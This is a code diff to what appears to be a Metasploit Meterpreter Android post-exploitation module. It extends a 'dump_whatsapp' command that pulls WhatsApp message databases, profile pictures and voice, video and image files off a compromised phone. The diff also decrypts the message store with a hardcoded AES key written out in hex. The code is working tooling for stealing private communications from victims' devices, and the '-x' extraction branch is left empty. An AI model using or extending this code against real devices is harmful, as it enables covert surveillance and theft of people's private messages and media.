@@ -397,46 +397,160 @@ class Console::CommandDispatcher::Android
   end
 
   def cmd_dump_whatsapp(*args)
-
-    path = "whatsapp_msgstore_" + Rex::Text.rand_text_alpha(4) + ".db"
+    
+    enumerate = false
+    enumpp = false
+    enummedia = false
+    getpp = false
+    getpp_index = 0
+    getmedia = false
+    getmedia_index = 0
+    getmedia_type = String.new
+    extractmsg = false
+    
     dump_whatsapp_opts = Rex::Parser::Arguments.new(
-      "-h" => [ false, "Help Banner" ]
+      "-h" => [ false, "Help Banner" ],
+      "-e" => [ false, "Enumerate available dumps"],
+      "-d" => [ false, "Dump whatsapp msgstore"],
+      "-x" => [ false, "Extract conversations from msgstore"],
+      "-p" => [ true,  "Get profile picture for specific contact"],
+      "-o" => [ true,  "Output path for msgstore.db" ],
+      "-r" => [ false, "Get list of available profile pictures"],
+      "-m" => [ false, "Get list of media files available"],
+      "-n" => [ true,  "Get media file by index, specified with type -t"],
+      "-t" => [ true,  "Set type of media file [image|video|voice|audio]"]
       )
 
     dump_whatsapp_opts.parse( args ) { | opt, idx, val |
       case opt
       when "-h"
         print_line( "Usage: dump_whatsapp [options]\n" )
-        print_line( "Get whatsapp contacts and messages." )
+        print_line( "Get whatsapp contacts ,messages and media." )
         print_line( dump_whatsapp_opts.usage )
         return
+      when "-e"
+        enumerate = true
+      when "-r"
+        enumpp = true
+      when "-m"
+        enummedia = true
+      when "-p"
+        getpp = true
+        getpp_index = val.to_i
+      when "-n"
+        getmedia = true
+        getmedia_index = val.to_i
+      when "-t"
+        getmedia_type = val.to_s
+      when "-x"
+        extractmsg = true
       end
     } 
-    
-    print_status("Dumping whatsapp local datastores")
-    dbstore = client.android.dump_whatsapp
-    print_status("Datastores were dumped")
 
-    encrypted = dbstore['encrypted']
+    if (enumerate)
+      print_status("Enumerating available dumps")
+      enums = client.android.dump_whatsapp_enum
 
-    if (encrypted)
-      print_status("Decrypting messages datastore")
+      print_status
+      print_line  "    MessageDb: #{enums['msgstore']}"
+      print_line  "       Images: #{enums['image']}"
+      print_line  "       Videos: #{enums['video']}"
+      print_line  "        Voice: #{enums['voice']}"
+      print_line  "        Audio: #{enums['audio']}"
+      print_line  "     Profiles: #{enums['profile']}"
+      print_line
+      return
+    end
+
+    if (enumpp)
+      print_status("Getting a list of available profile pictures")
+      enums = client.android.dump_whatsapp_enum_pp
+
+      print_status
+      print_line "    File Name"
+      print_line "    ========="
+      enums.each_with_index { |a, index|
+        print_line "    #{index + 1} #{a}"
+      }
+      print_line
+      return
+    end
+
+    if (enummedia)
+      print_status("Getting a list of available media files")
+      enums = client.android.dump_whatsapp_enum_media
+
+      print_status
+      enums.each { |a|
+        print_line "    #{a['type']}"
+        print_line "    " + '=' * a['type'].length
+
+        a['array'].each_with_index { |arr, index| 
+          print_line "    #{index + 1} #{arr}"
+        }
+
+        print_line
+      }
+      return
+    end
+
+    if (getpp)
+      print_status("Getting profile picture of index #{getpp_index.to_s}")
+      image = client.android.dump_whatsapp_get_media("profile", getpp_index-1)
+
+      if(image and image['raw'] and image['raw'].length > 0)
+        path = "dump_whatsapp_" + image['filename']
+        save_and_open(image['raw'], path)
+        print_line("Profile picture saved to: #{::File.expand_path(path)}")
+ 
+      else
+        print_error("Failed to get profile picture, check your specified index")
+      end
+      return
+    end
+
+    if (getmedia)
+      print_status("Getting media file of index #{getmedia_index.to_s}")
+      media = client.android.dump_whatsapp_get_media(getmedia_type, getmedia_index-1)
+
+      if(media and media['raw'] and media['raw'].length > 0)
+        path = "dump_whatsapp_" + media['filename']
+        save_and_open(media['raw'], path)
+        print_line("Media file saved to: #{::File.expand_path(path)}")
+ 
+      else
+        print_error("Failed to get media, check your specified media type [-t]")
+      end
+      return
+    end
+
+
+    print_status("Dumping whatsapp local msgstore")
+    msgstore = client.android.dump_whatsapp
+    path = 'dump_whatsapp_msgstore.db'
+
+    if (msgstore)
+      print_status("Decrypting msgstore")
 
       cipher = OpenSSL::Cipher::AES192.new(:ECB)
       cipher.decrypt
       cipher.key = "346a23652a46392b4d73257c67317e352e3372482177652c".scan(/../).map(&:hex).map(&:chr).join
 
-      ::File.open(path, 'wb') { |file| file.write(cipher.update(encrypted) + cipher.final) }
+      ::File.open(path, 'wb') { |file| file.write(cipher.update(msgstore) + cipher.final) }
 
-      print_status("Decrypted msgstore saved to #{path}")
-
-      print_status("Dumping decrypted messages\n")
+      print_status("Decrypted msgstore saved to #{::File.expand_path(path)}")
 
       begin
         db = SQLite3::Database.open path
         messages = db.prepare("SELECT Count(*) FROM messages").execute
         chat_list = db.prepare("SELECT Count(*) FROM chat_list").execute
-        print_status("Got #{messages.first[0]} messages, #{chat_list.first[0]} in chatlist") 
+        print_status("Got #{messages.first[0]} messages, #{chat_list.first[0]} conversations") 
+
+        if (extractmsg)
+          print_status("Extracting chat conversations")
+
+          
+        end
 
       rescue SQLite3::Exception => e    
         print_error("Error getting data from database")
@@ -447,10 +561,20 @@ class Console::CommandDispatcher::Android
         db.close if db
       end
 
+      print_status("Whatsapp was dumped successfully")
+    else
+      print_error("Couldn't dump whatsapp msgstore")
+    end   
+
+
+  end
+
+  def save_and_open(data, path)
+    ::File.open(path, 'wb') do |fd|
+      fd.write(data)
     end
-
-    print_status("Whatsapp was dumped successfully")
-
+    path = ::File.expand_path(path)
+    Rex::Compat.open_file(path)
   end
 
   #
